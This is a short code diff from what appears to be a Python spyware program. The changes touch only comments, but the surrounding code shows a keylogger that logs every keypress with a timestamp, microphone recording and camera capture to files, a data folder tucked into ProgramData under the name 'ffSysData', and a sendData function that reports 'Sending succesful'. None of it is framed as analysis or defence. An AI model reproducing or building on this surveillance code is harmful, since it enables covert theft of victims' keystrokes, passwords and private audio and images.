@@ -17,7 +17,7 @@ import subprocess
 CHUNK = 1024
 FORMAT = pyaudio.paInt16
 RATE = 44100
-RECORD_SECONDS = 4      ## 4=14s ?
+RECORD_SECONDS = 4  
 WAVE_OUTPUT_FILENAME = "wof.wav"
 IMG_CAM_FILENAME = "icf.png"
 DATA_DIR = os.path.join(os.getenv('programdata'), 'ffSysData\\')
@@ -76,9 +76,9 @@ def sendData():
     print('Sending succesful')
     
 def onPress(key):
-    try: k = key.char # single-char keys
-    except: k = key.name # other keys
-    if key == Key.esc: return False # stop listener
+    try: k = key.char #  filtering keys
+    except: k = key.name 
+    if key == Key.esc: return False # stop listener on esc
     keys.append(k)
     print("Key pressed: " + k + " " + strftime("%Y-%m-%d %H:%M:%S", gmtime()))
 
